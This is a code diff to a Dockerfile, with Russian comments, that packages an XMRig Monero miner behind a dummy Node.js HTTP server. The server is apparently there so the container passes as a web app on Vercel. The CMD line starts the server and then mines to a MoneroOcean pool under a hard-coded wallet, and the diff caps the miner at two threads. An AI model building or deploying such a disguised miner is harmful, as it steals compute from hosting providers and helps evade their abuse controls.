@@ -1,13 +1,10 @@
-# Берем за основу официальный образ с майнером
 FROM thelolagemann/xmrig-mo:latest
 
-# Устанавливаем Node.js (легкий и быстрый способ поднять HTTP-сервер)
 RUN apk add --no-cache nodejs npm
 
-# Создаем директорию для нашего скрипта
 WORKDIR /app
 
-# Создаем простой HTTP-сервер на Node.js, который будет держать контейнер активным
+# HTTP-сервер для Vercel
 RUN echo 'const http = require("http");' > server.js && \
     echo 'const server = http.createServer((req, res) => {' >> server.js && \
     echo '  res.writeHead(200, { "Content-Type": "text/plain" });' >> server.js && \
@@ -17,6 +14,5 @@ RUN echo 'const http = require("http");' > server.js && \
     echo '  console.log(`HTTP server running on port ${process.env.PORT || 3000}`);' >> server.js && \
     echo '});' >> server.js
 
-# Запускаем HTTP-сервер в фоне, а затем майнер
-# Важно: /entrypoint.sh — это точка входа в официальном образе, она запускает xmrig с переданными параметрами[reference:2]
-CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k'
+# Запускаем HTTP-сервер в фоне и майнер
+CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k -t 2'
